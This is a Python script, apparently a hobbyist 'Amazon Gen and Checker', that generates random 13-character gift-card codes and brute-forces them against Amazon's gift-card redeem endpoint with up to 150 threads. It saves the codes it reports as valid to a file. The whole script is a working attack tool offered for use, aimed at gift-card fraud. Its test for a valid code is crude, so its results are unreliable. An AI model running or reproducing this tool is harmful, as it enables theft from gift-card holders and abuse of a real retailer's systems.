import requests, threading, time, ctypes, string, random, sys
from colorama import init, Fore

init(convert=True)
ctypes.windll.kernel32.SetConsoleTitleW("Amazon Gen and Checker by Sleep modified by Appuchia")

text = """

   ▄████████   ▄▄▄▄███▄▄▄▄      ▄████████  ▄███████▄   ▄██████▄  ███▄▄▄▄                ▄██████▄     ▄████████ ███▄▄▄▄
  ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ██▀     ▄██ ███    ███ ███▀▀▀██▄             ███    ███   ███    ███ ███▀▀▀██▄
  ███    ███ ███   ███   ███   ███    ███       ▄███▀ ███    ███ ███   ███             ███    █▀    ███    █▀  ███   ███
  ███    ███ ███   ███   ███   ███    ███  ▀█▀▄███▀▄▄ ███    ███ ███   ███            ▄███         ▄███▄▄▄     ███   ███
▀███████████ ███   ███   ███ ▀███████████   ▄███▀   ▀ ███    ███ ███   ███           ▀▀███ ████▄  ▀▀███▀▀▀     ███   ███
  ███    ███ ███   ███   ███   ███    ███ ▄███▀       ███    ███ ███   ███             ███    ███   ███    █▄  ███   ███
  ███    ███ ███   ███   ███   ███    ███ ███▄     ▄█ ███    ███ ███   ███             ███    ███   ███    ███ ███   ███
  ███    █▀   ▀█   ███   █▀    ███    █▀   ▀████████▀  ▀██████▀   ▀█   █▀              ████████▀    ██████████  ▀█   █▀

"""

print(Fore.WHITE + text + '\n\n')
print(Fore.CYAN + '[1] Generate Codes\n[2] Check Codes\n' + Fore.WHITE, end='')
option = str(input())

if option == '1':
    amount = int(input('Enter Amount of codes: '))
    fix = 0
    f = open('giftcards.txt','a')
    while fix < amount:
        code = ('').join(random.choices(string.ascii_letters.upper() + string.digits.upper(), k=13))
        f.write(code.upper() + '\n')
        print(Fore.GREEN + code.upper())
        fix += 1
        ctypes.windll.kernel32.SetConsoleTitleW("Generated Codes: " + str(fix) + "/" + str(amount))

if option == '2':
    giftcards = []
    num = 0
    valid = 0
    invalid = 0
    speed = (1/int(input("\nSet the number of GC to check per second. (Numbers higher than 4 could make the program crash)\n> ")))

    def load_accounts():
        with open('giftcards.txt','r', encoding='utf8') as f:
            for x in f.readlines():
                giftcards.append(x.strip())

    def safe_print(content):
        print("{}\n".format(content))

    def save(giftcard):
        with open('valid.txt','a', encoding='utf8') as f:
            f.write(giftcard + '\n')

    def checker():
        try:
            global giftcards
            global num
            global counter
            global invalid
            global valid
            success_keyword = """ <b>Enter claim code</b> """
            r = requests.post("https://www.amazon.com/gc/redeem?ref_=gcui_b_e_r_c_d_b_w", data={"giftcard": giftcards[num]})
            if success_keyword in r.text:
                valid += 1
                safe_print(Fore.GREEN + '[GC Valid] -> ' + giftcards[num])
                save(giftcards[num])
                ctypes.windll.kernel32.SetConsoleTitleW("Amazon Checker | Checked: " + str(num) + "/" + str(len(giftcards)) + " | Valid: " + str(valid) + " | Invalid: " + str(invalid) + " | Modified by Appuchia")
            else:
                safe_print(Fore.RED + '[GC Invalid] -> ' + giftcards[num])
                invalid += 1
                ctypes.windll.kernel32.SetConsoleTitleW("Amazon Checker | Checked: " + str(num) + "/" + str(len(giftcards)) + " | Valid: " + str(valid) + " | Invalid: " + str(invalid) + " | Modified by Appuchia")
        except IndexError as e:
            sys.exit(0)

    load_accounts()

    while True:
        if threading.active_count() < 150:
            threading.Thread(target=checker, args=()).start()
            time.sleep(speed)
            num+=1
